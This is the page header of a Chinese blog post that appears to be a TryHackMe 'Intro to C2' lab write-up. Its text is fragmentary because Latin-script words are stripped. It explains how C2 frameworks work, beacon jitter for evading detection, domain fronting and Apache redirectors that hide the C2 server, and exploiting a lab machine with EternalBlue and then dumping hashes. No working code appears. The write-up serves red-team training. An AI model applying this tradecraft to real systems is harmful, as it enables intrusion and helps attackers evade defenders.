<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>THM-C2简介 | hybcx</title><meta name="keywords" content="TryHackMe"><meta name="author" content="hybcx,19815455497@163.com"><meta name="copyright" content="hybcx"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="THM-C2简介"><meta name="application-name" content="THM-C2简介"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="THM-C2简介"><meta property="og:url" content="http://hybcx.xyz/2024/07/10/thm-c2-jian-jie/index.html"><meta property="og:site_name" content="hybcx"><meta property="og:description" content="0x01 介绍 欢迎来到 C2 简介 命令与控制 (C2) 框架是红队和高级对手手册的重要组成部分。它们不仅可以在交战期间轻松管理受损设备，而且通常有助于横向移动。 Room Objectives 房间目标 在这个房间中，我们将深入了解命令和控制框架，以便更好地理解以下主题：  命令和控制框架如何运"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg"><meta property="article:author" content="hybcx"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg"><meta name="description" content="0x01 介绍 欢迎来到 C2 简介 命令与控制 (C2) 框架是红队和高级对手手册的重要组成部分。它们不仅可以在交战期间轻松管理受损设备，而且通常有助于横向移动。 Room Objectives 房间目标 在这个房间中，我们将深入了解命令和控制框架，以便更好地理解以下主题：  命令和控制框架如何运"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://hybcx.xyz/2024/07/10/thm-c2-jian-jie/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?d98ea8480e5ec98a243adfc7bd46b93a";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script>const GLOBAL_CONFIG = {
  linkPageTop: {"enable":true,"title":"向✌们无限学习","addFriendPlaceholder":"昵称（请勿包含博客等字样）：\n网站地址（要求博客地址，请勿提交个人主页）：\n头像图片url（请提供尽可能清晰的图片，我会上传到我自己的图床）：\n描述：\n站点截图（可选）：\n"},
  peoplecanvas: undefined,
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
  LA51: {"enable":true,"ck":"3JLPGIZJOJw6Nvu2","LingQueMonitorID":"3JLPOLHV5W6IAty5"},
  greetingBox: {"enable":true,"default":"晚上好👋","list":[{"greeting":"晚安😴","startTime":0,"endTime":5},{"greeting":"早上好鸭👋, 祝你一天好心情！","startTime":6,"endTime":9},{"greeting":"上午好👋, 状态很好，鼓励一下～","startTime":10,"endTime":10},{"greeting":"11点多啦, 在坚持一下就吃饭啦～","startTime":11,"endTime":11},{"greeting":"午安👋, 宝贝","startTime":12,"endTime":14},{"greeting":"🌈充实的一天辛苦啦！","startTime":14,"endTime":18},{"greeting":"19点喽, 奖励一顿丰盛的大餐吧🍔。","startTime":19,"endTime":19},{"greeting":"晚上好👋, 在属于自己的时间好好放松😌~","startTime":20,"endTime":24}]},
  twikooEnvId: '',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: true,
  mainTone: undefined,
  authorStatus: {"skills":null},
  algolia: {"appId":"Z7A3XW4R2I","apiKey":"12db1ad54372045549ef465881c17e743","indexName":"my-hexo-blog","hits":{"per_page":6},"languages":{"input_placeholder":"输入关键词后按下回车查找","hits_empty":"找不到您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    simplehomepage: false,
    post: true
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: hybcx","link":"链接: ","source":"来源: hybcx","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'mediumZoom',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: 'hybcx',
  title: 'THM-C2简介',
  postAI: '',
  pageFillDescription: '0x01 介绍, 欢迎来到 C2 简介, Room Objectives 房间目标, 房间先决条件, 0x02 C2框架, 什么是C2框架, C2结构, C2 Server, Agents / Payloads, Listeners, Beacons, 混淆代理回调, Sleep Timers, Jitter, Payload 类型, Stageless Payloads, Staged Payloads, Payload Formats 有效负载格式, Modules, Post Exploitation Modules, Pivoting Modules, Facing the world, Domain Fronting, C2 配置, 0x03 常见C2框架, 常见 C2 框架, 免费 C2 框架, Metasploit, Armitage, Powershell Empire/Starkiller, Covenant, Sliver, 付费 C2 框架, Cobalt Strike, Brute Ratel, 其他 C2 框架, 0x04 设置 C2 框架, 设置 Armitage, Teamserver, 准备我们的环境, 启动并连接到 Armitage, 0x05 C2操作基础, 访问和管理您的 C2 基础设施, 基本操作安全, 访问本地监听的远程 C2 服务器, 在Armitage简历监听器, 获得回调, 监听器类型, Standard Listener, HTTP/HTTPS Listeners, DNS Listener, SMB Listener, 0x06 命令、控制和征服, 漏洞利用示例, 使用 Armitage 进行主机枚举, Armitage 的利用, Practice Time, 解决方案, 0x07 高级C2设置, 总是有改进的空间, C2 重定向器, 什么是重定向器, 重定向器如何设置, 使用修改后的标头生成有效负载, 修改 Apache 配置文件, 设置漏洞利用/多重/处理程序, 0x08 总结, Recap 回顾, 如何选择 C2 框架介绍欢迎来到简介命令与控制框架是红队和高级对手手册的重要组成部分它们不仅可以在交战期间轻松管理受损设备而且通常有助于横向移动房间目标在这个房间中我们将深入了解命令和控制框架以便更好地理解以下主题命令和控制框架如何运作您可能使用的各种组件如何建立基本的命令和控制框架使用或熟悉命令和控制框架如何管理命令和控制框架管理命令和控制框架时的注意事项以及更多房间先决条件框架的一般经验有关更多信息请参阅模块对红队的总体熟悉有关更多信息请参阅红队基础知识室一般熟悉利用易受攻击的虚拟机框架什么是框架在尝试消化框架的各个组件时它可能会令人生畏然而它们不一定是这样为了更好地理解框架最基本的含义请考虑一个侦听器服务器它能够同时处理多个反向回调代理它是一个服务器但用于反向与不同几乎所有框架都需要特殊的有效负载生成器这通常是框架本身内置的功能例如是一个框架有自己的有效负载生成器那么到底是什么让框架比普通的监听器更好呢似乎有人需要做的就是在中实现会话管理你也有同样的事情吗虽然这是事实但框架的亮点在于其后利用功能结构为了理解命令和控制框架我们必须首先了解服务器的各个组件让我们从最基本的组件开始服务器本身服务器充当客服人员回拨的中心特工将定期联系服务器并等待操作员的命令代理是由框架生成的程序用于回调服务器上的侦听器大多数时候与标准反向相比该代理可以实现特殊功能大多数框架都实现伪命令以使操作员的工作更轻松这方面的一些示例可能是用于将文件下载或上传到系统的伪命令重要的是要知道代理可以高度可配置可以调整代理向服务器上的侦听器发送信标的频率等等在最基本的层面上侦听器是在服务器上运行的应用程序等待通过特定端口或协议的回调其中一些示例包括和或是代理回调运行在服务器上的侦听器的过程混淆代理回调一些安全分析师防病毒软件和下一代防火墙在尝试识别命令和控制流量时寻找的一项关键内容是以及设备向服务器发出信标的速率假设防火墙观察到的流量如下所示一种模式正在开始形成代理每秒发出一次信标这意味着它有一个秒的睡眠定时器采用睡眠计时器并为其添加一些变化我们的信标现在可能会表现出一种奇怪的模式可能显示出更接近普通用户的活动现在设置为半不规则模式这使得在常规用户流量中识别起来稍微困难一些在更高级的框架中可以更改各种其他参数例如文件抖动或向添加垃圾数据或让正在传输的文件使其看起来比实际上更大的示例代码可能如下所示值得注意的是这是一个基本的示例但它可能需要更多的数学知识设置上限和下限获取上次睡眠的百分比并在此基础上进行构建因为这是一个介绍室所以我们不会为您提供复杂的公式类型与常规反向非常相似您可以在框架中使用两种主要类型的有效负载分阶段和无阶段有效负载无阶段有效负载是两者中最简单的它们包含完整的代理并将回调服务器并立即开始设置信标您可以参考下图以更好地了解无级有效负载的运行方式使用有效负载建立信标的步骤如下受害者下载并执行开始向服务器发送信标分阶段的有效负载需要回调服务器来下载代理的其他部分这通常被称为因为它被投放到受害者计算机上以下载我们暂存有效负载的第二阶段这是优于无级有效负载的首选方法因为需要编写少量代码来从服务器检索代理的附加部分它还可以更轻松地混淆代码以绕过防病毒程序使用暂存有效负载建立信标的步骤如下受害者下载并执行回调服务器进行第阶段服务器将阶段发送回受害者工作站第阶段被加载到受害者工作站的内存中信标初始化红队成员威胁参与者可以与服务器上的受害者进行交互有效负载格式您可能知道文件可执行文件并不是在系统上执行代码的唯一方式一些框架支持各种其他格式的有效负载例如脚本其中可能包含代码并且可以使用进行编译和执行文件文件应用程序脚本微软办公文档还有很多有关各种其他有效负载格式的更多信息您应该查看初始访问模块中的武器化室模块是任何框架的核心组件它们增加了使代理和服务器更加灵活的能力根据框架脚本必须用不同的语言编写有它是用编写的支持多种语言的模块是用编写的还有许多其他模块是用许多其他语言编写的后利用模块只是处理初始妥协点之后的任何事情的模块这可能像运行来查找横向移动路径一样简单也可能像转储和在内存中解析凭据一样复杂有关的更多信息请参阅基础知识室框架的最后一个主要组件之一是其旋转模块可以更轻松地访问框架内的受限网络段如果您在系统上具有管理访问权限则可以打开信标它可以使计算机通过协议充当代理这可能允许受限网段中的计算机与您的服务器进行通信上图展示了受限网段内的主机如何回调服务器受害者回调非限制网段中另一个受害者上的命名管道非限制网段中的受害者通过标准信标回呼服务器然后服务器将命令发送回非限制网段中的受害者然后非限制网段中的受害者将指令转发到限制网段中的主机所有红队成员必须克服的一个重要障碍是将基础设施置于清晰可见的位置有许多不同的方法可以做到这一点最流行的方法之一称为域名前置域前端使用已知的良好主机例如经营的业务提供有关连接详细信息的增强指标以及缓存连接请求以节省带宽红队成员可以滥用此功能使工作站或服务器看起来正在与已知的可信地址进行通信地理位置结果将显示最近的服务器所在位置并且地址将显示为的所有权上图描述了域前置的工作原理运营商拥有一个通过代理所有请求的域受害者向域发送信标代理请求然后查看标头并将流量中继到正确的服务器然后服务器使用命令响应然后受害者收到来自的命令配置下一个技术有几个不同产品的多个名称反向代理等等然而它们或多或少都是相同的所有代理功能或多或少允许用户控制传入请求的特定元素假设传入的连接请求具有标头我们可以使用您可以使用的特定技术反向代理等显式提取此标头并确保您的服务器使用基于的响应进行响应而如果普通用户查询服务器他们可能会看到一个通用网页这完全取决于您的配置上图描述了配置文件的工作原理受害者通过请求中的自定义标头向服务器发出信标而分析师则具有正常的请求请求通过代理接收请求并查找自定义标头然后根据评估如何响应服务器响应客户端并响应分析人员受感染设备由于请求已加密因此可能无法提取特定标头例如或通过使用配置文件我们也许能够隐藏我们的服务器防止安全分析师的窥探有关型材如何强大的更多信息请参阅这篇关于了解的可延展型材的博客文章在任务中我们将解释和探索另一种称为重定向器的技术我们将获得配置和的实践经验以演示如何设置重定向器常见框架常见框架在您的整个旅程中您可能会遇到许多不同的框架我们将讨论一些被红队成员和对手广泛使用的流行框架我们将把它分为两个部分高级付费您可能会问一些问题例如为什么我要使用高级或付费框架这是一个很好的问题高级付费框架通常不太可能被反病毒供应商检测到这并不是说它不可能被检测到只是开源项目一般都很好理解并且可以轻松开发签名通常高级框架通常具有更高级的后开发模块旋转功能甚至开源软件开发人员有时可能无法满足的功能请求例如提供的一项功能是从信标打开隧道的能力而大多数其他框架都没有如果代理在您的特定情况下不能很好地工作这可能是一个很棒的功能您必须进行研究找出最适合您的团队的方法免费框架由开发和维护的框架是最流行的利用和后利用框架之一该框架是公开可用的并且安装在大多数渗透测试发行版上框架的扩展它添加了图形用户界面并用编写与非常相似这是因为它们都是由开发的提供了一种简单的方法来枚举和可视化所有目标除了看起来很像之外它甚至还提供了一些独特的功能其中最受欢迎的一项可以在攻击菜单中找到此功能称为万福玛丽攻击它尝试对特定工作站上运行的服务运行所有漏洞利用确实是快速而简单的黑客攻击和是另一个非常受欢迎的最初由的和创建目前该项目已停止并已由安全团队和接手的特点是使用多种语言编写的代理兼容多种平台使其成为一款极其通用的有关的更多信息我们建议您查看房间的是我们将介绍的最后一个免费框架到目前为止它是用编写的最独特的框架之一与不同它主要用于通过具有高度可定制代理的和侦听器进行后利用和横向移动的是一个先进的高度可定制的多用户基于的框架是用编写的这使得对植入物进行逆向工程变得异常困难它支持各种通信协议例如等此外它还支持用于附加功能的文件用于屏蔽通信的域用于信标的自动证书生成等等付费框架的以前由创建可以说是仅次于的最著名的命令和控制框架之一与非常相似它是用编写的并且设计得尽可能灵活有关更多信息请参阅的视频培训页面它提供了本人对红队运作和框架的更多见解或开发的是一个指挥和控制框架被宣传为可定制的指挥和控制中心或框架它提供了真正的对手模拟体验是一个独特的框架有关该框架的更多信息作者提供了一个视频培训页面其中演示了该框架中的许多功能其他框架有关框架及其功能的更全面列表请查看这是由和维护的项目它有一个更全面的列表列出了当前可用的几乎所有框架我们强烈建议您在本次会议结束后去查看并探索本次会议中未讨论的其他一些框架设置框架让我们设置一个服务器为了更好地了解设置和管理服务器的要求我们将使用提醒一下是框架的因此它几乎具有标准框架的所有方面注意如果您使用您可以跳到准备我们的环境部分设置下载构建和安装以下是根据进行的但尝试下来有错误建议的话直接利用安装首先我们必须从克隆存储库接下来我们必须构建当前版本我们可以使用以下命令来做到这一点鉴于这一步无法正确执行我就不再展示了该文件将启动多个用户能够连接的服务器该文件有两个参数地址您的红队操作员同伴将使用该地址连接到您的服务器共享密码您的红队操作员同伴将使用共享密码访问您的服务器这是您将用于连接到的文件执行二进制文件后将打开一个新的提示符显示连接信息和您的用户名这应该被视为昵称而不是用于身份验证的用户名和密码这里的话直接执行即可准备我们的环境在启动之前我们必须进行一些运行前检查以确保配置正确严重依赖的数据库功能因此我们必须在启动之前启动并初始化数据库为此我们必须执行以下命令这里我执行的是最后我们必须初始化数据库以便可以使用它需要注意的是在尝试初始化数据库时您不能成为用户在上您必须使用用户初始化完成后我们终于可以启动了启动并连接到当操作框架时您永远不想公开暴露管理接口您应该始终在本地界面上监听而不是面向公众的界面这使得其他运营商的访问变得复杂幸运的是有一个简单的解决方案对于要访问服务器的操作员您应该为他们创建一个新的用户帐户并在服务器上启用访问他们将能够转发的端口明确拒绝用户监听这是因为它本质上是一个带有冲突消除服务器的共享服务器当多个用户连接到该服务器时您不会看到其他用户看到的所有内容使用您必须监听地址不过这里需要先利用启动不过直接启动无脑跟着提示走也可这里我打开也是有一些报错最后重新输入啥也不修改直接连接发现成功了虽然还有点报错现在已设置并正常工作在下一个任务中我们将了解有关安全访问如上所述创建侦听器各种侦听器类型生成有效负载等等的更多信息操作基础访问和管理您的基础设施现在我们已经了解了如何设置服务器我们将介绍您在访问服务器时应该了解的一些基本操作细节请务必注意您不需要在此任务中执行任何操作这是为了获得一般经验并熟悉命令和控制框架基本操作安全我们在上一节中简要讨论了这一点您永远不应该直接访问您的管理界面这主要是为了您提高操作安全性对服务器进行指纹识别非常容易例如在之前的版本中服务器能够通过响应末尾的额外空格进行识别使用这种策略许多蓝队成员可以对所有可公开访问的服务器进行指纹识别有关指纹识别和识别服务器的更多信息请查看博客上发布的这篇文章访问本地监听的远程服务器本节将重点介绍如何通过端口转发安全地访问您的服务器如果您之前使用进行过端口转发请随意跳过本节您可能不会学到任何新东西对于那些不熟悉的人来说端口转发允许我们通过将本地端口转发到远程服务器来托管远程计算机上的资源或者允许我们访问我们正在连接的远程计算机上的本地资源在某些情况下这可能是为了绕过防火墙或者在我们的例子中这可以是出于操作安全原因而完成的现在我们已经更好地理解了为什么要转发端口让我们回顾一下如何进行在我们从任务设置的中我们的正在上侦听本地主机为了访问远程端口我们必须设置本地端口转发将本地端口转发到远程服务器我们可以使用客户端上的标志来做到这一点我们强烈建议为必须侦听公共接口的服务器设置防火墙规则以便只有目标用户才能访问您的服务器有多种方法可以做到这一点如果您托管云基础设施则可以设置安全组或使用基于主机的防火墙解决方案例如或在简历监听器接下来我们将讨论所有服务器都有的主题这就是侦听器创建为了紧扣主题我们将演示如何使用设置基本侦听器然后探索您可能在其他各种框架中遇到的一些其他理论侦听器让我们创建一个在上运行的基本监听器首先单击下拉菜单并转到部分您应该看到三个选项绑定反向和设置指的是您必须连接到这些主机指的是标准这是我们将使用的选项单击反向后将打开一个新菜单提示您配置有关侦听器的一些基本详细信息特别是您要侦听的端口以及要选择的侦听器类型有两个选项可供选择或是指标准的风格的反向是标准的反向设置侦听器后您可以使用生成标准反向并将设置为服务器以接收对服务器的回调获得回调使用生成后我们可以将有效负载传输到目标机器并执行它一两分钟后您应该会收到机器的回调监听器类型如前所述标准反向侦听器并不是唯一存在的侦听器有许多品种使用许多不同的协议但是我们将介绍一些常见的问题如下所示它们通常通过原始或套接字直接通信以明文发送命令完全支持通用侦听器这些通常作为某种服务器前端并使用域前端或可延展配置文件等技术来掩盖服务器当专门通过进行通信时通信被阻止的可能性较小完全支持侦听器监听器是一种流行的技术专门用于渗透阶段通常需要设置额外的基础设施或者至少必须购买和注册域名并且必须配置公共服务器借助其他工具可以在中设置操作有关更多信息请参阅和的演示这些对于绕过网络代理通常非常有用通过命名管道进行通信是一种流行的选择方法尤其是在处理受限网络时它通常可以实现更灵活的旋转多个设备相互通信并且只有一个设备通过等更常见的协议进行回传支持命名管道命令控制和征服漏洞利用示例使用进行主机枚举在让您自己开始之前我们将演示如何利用示例虚拟机首先我们将在中执行端口扫描方法是转到主机部分将鼠标悬停在上然后选择快速扫描选择快速扫描后会弹出一个新选项这将提示您输入要扫描的地址范围您应在此框中输入已部署虚拟机的地址按确定后等待一两分钟您应该会看到一个名为的新选项卡打开并且工作区窗口中显示一个新计算机在选项卡中您将看到原始扫描结果现在您已经了解了如何执行基本端口扫描请尝试对目标执行各种其他扫描并查看可以从主机检索哪些附加信息提示全面扫描将抓取横幅枚举软件版本枚举操作系统版本等等的利用接下来我们将展示的利用在我们的示例中我们的受害者是一台计算机更具体地说是该机器容易受到经典漏洞的攻击为了找到这一点我们将重点关注最右侧的文件夹选项卡我们将展开漏洞利用下拉列表然后找到下拉列表然后找到下拉列表然后您将看到所有漏洞利用接下来您可以双击您选择的漏洞利用程序或将漏洞利用程序拖放到主机上然后将打开一个新窗口单击启动将触发漏洞利用单击启动后您会注意到打开了一个新的漏洞利用选项卡将运行通常执行的所有常规检查对于永恒之蓝它运行标准检查脚本然后运行漏洞利用脚本直到获得成功的值得注意的是在这个漏洞利用中它默认选择了确保您完全阅读了漏洞利用信息和选项以查看是否可以选择或收到后右键单击主机并选择交互这将打开一个您熟悉的标准为了获得我们建议您运行模块现在您已经了解了如何使用来利用主机现在您将可以通过使用和攻击虚拟机来练习您的技能您可以遵循多种利用路径我们鼓励您探索可能找到的各种利用路径以便更好地了解和中的利用和后利用模块提醒一下只是带有的所有相同的漏洞都存在并且以相同的方式分类解决方案如果您在破坏计算机时遇到困难请参阅以下使用破坏虚拟机的分步指南如果您想使用请使用本指南其中显示了分步说明现在进入我们的第一步是启动之后直接打永恒之蓝配置好选项直接打之后我们成功为管理员权限转储用户的哈希值以下是利用攻击示例首先扫描发现端口开放找到模块中的永恒之蓝利用双击打开配置好端口等信息开始攻击如上图成功可以右键靶机进行交互式连接高级设置总是有改进的空间正如您可能已经猜到的那样本身并不是用于高级对手操作的服务器它并不像人们所希望的那样灵活您无法将代理配置为每秒发出一次信标并出现抖动下一代防火墙可以快速捕获此流量因为它是持续不断的流量此外任何人都可以连接到侦听器并相对快速地了解正在发生的情况重定向器什么是重定向器在我们深入配置重定向器之前首先它是什么重定向器正如其听起来一样它是一个根据请求正文中的信息重定向请求的服务器在生产系统中您可能会看到负载均衡器形式的重定向器该服务器通常运行或在本实验中我们将利用及其一些模块来构建重定向器回到在此任务中我们可以在上设置一些基本配置以允许更高级的配置我们将设置一个重定向器通常此配置是在多个主机上设置的这样做的目的是隐藏真正的命令和控制服务器下图说明了受害者和服务器之间的通信是如何发生的通常当您有回调时您可以将回调主机设置为域例如当用户提出投诉时您的服务器被举报是很常见的情况通常服务器很快就会被关闭有时短则小时长则小时设置重定向器可确保您在参与过程中收集的任何信息都是安全可靠的但这如何阻止服务器被关闭呢当然如果有人在您的服务器上对进行了指纹识别就会有人提出投诉然后它就会被删除这是事实因此您应该设置防火墙以仅允许与重定向器之间的通信以减轻任何潜在风险重定向器如何设置在我们深入配置重定向器之前我们必须首先了解重定向器是如何设置的我们将使其与我们可用的工具和保持一致在中我们将利用一个名为的模块或模块该模块允许我们编写规则根据特定的标头或内容将请求转发到服务器上的内部或外部主机我们需要使用几个模块来配置我们的重定向器必须启用以下模块注意如果您使用则端口上已经有一个服务正在运行您必须在中更改侦听的默认端口您必须在启动服务之前执行此操作否则它将无法启动您可以使用以下命令安装并启用它使用我们能够配置请求的各个方面例如用户代理威胁参与者对其负载中的用户代理进行轻微调整是很常见的它存在于每个请求中并且它们看起来或多或少都相同并且安全分析师很有可能会忽略修改后的用户代理字符串在本次演示中我们将使用生成反向负载然后我们将在中检查请求使用修改后的标头生成有效负载生成修改后的可执行文件并将其传输给受害者后在主机上打开并使用过滤器仅查看请求开始捕获数据包后在受害系统上执行二进制文件您会注意到请求带有我们修改后的用户代理现在我们有了一个可以在请求中控制的字段让我们创建一个规则来过滤用户代理并将其转发到我们的服务器修改配置文件这一部分听起来可能令人生畏但实际上很简单我们将采用默认的配置并根据我们的优势进行修改在基于的系统上默认配置可以在中找到现在我们已经了解了配置文件的结构我们必须在配置文件中添加几行以启用重写引擎添加重写条件最后通过代理这听起来相当复杂但其实很简单要启用我们必须将添加到部分的新行中现在我们将使用针对用户代理的重写条件有关请求目标的完整列表请参阅上的文档因为我们只想匹配用户代理所以我们需要使用一些基本的正则表达式来捕获它添加表示字符串的开头并在系列末尾添加从而得到此正则表达式将仅捕获用户代理我们可以将此行添加到我们的配置中如前所述仅允许使用用户代理的请求访问最后我们必须通过通过我们的代理将请求转发到为此我们必须使用模块的功能为此我们只需要指定请求将转发到的基本在我们的例子中我们只需要以及我们要将请求转发到的目标这会因设置而异但此地址将是您的服务器在实验室场景中正在侦听的将是本地主机和端口这将为我们提供一个完整的配置文件如下所示设置漏洞利用多重处理程序为了正确设置我们需要进行一些修改在我们的实验室中我们必须将参数设置为我们期望从中建立连接的传入接口这将是在现实世界中这将是您的重定向器将连接到的公共接口也称为您的公共地址并且将是您喜欢的任何内容对于实验室我们将使用这可以是您在生产中喜欢的任何内容与往常一样最佳实践是通过标准协议运行服务因此应在端口上运行应在端口上运行还需要为和复制这些选项接下来我们需要设置该值将是您的重定向器的地址或域名之后我们需要设置这将是重定向器上运行或的端口最后我们必须将设置为这将使响应信息因此所有查询都会通过重定向器而不是您的服务器现在您已经了解了必须配置的内容让我们深入了解一下完成所有设置后运行现在应该通过重定向器代理所有通信为了提高认识下图是我们实验室中重定向器的设置方式提醒一下在参与中您将需要使用多个主机和记录而不是地址查看总结回顾在这个房间中您希望学到很多有关命令和控制框架的知识并且能够将您在这个房间中获得的知识应用于现实世界归根结底红队行动中的几乎每个人都使用命令和控制框架它是每个红队成员工具包的重要组成部分我们鼓励您出去探索本会议室中未涵盖或提及的各种框架如何选择框架完成这个房间后您可能会留下一些问题希望其中之一是我如何知道在我的红队运营中选择什么框架对此没有正确或错误的答案只有一些您应该首先回答的一般性问题你的目标是什么你有预算吗您需要高度可定制的东西吗是否需要现成的您需要有创建自己的模块脚本的能力吗您需要内置报告吗然后您应该将该信息输入到矩阵电子表格中并根据上述问题缩小选择范围如果您找到符合您标准的高级框架强烈建议您申请评估试用以确定该框架是否最适合您',
  isPost: true,
  isHome: false,
  isHighlightShrink: true,
  isToc: true,
  postUpdate: '2024-08-01 16:12:41',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
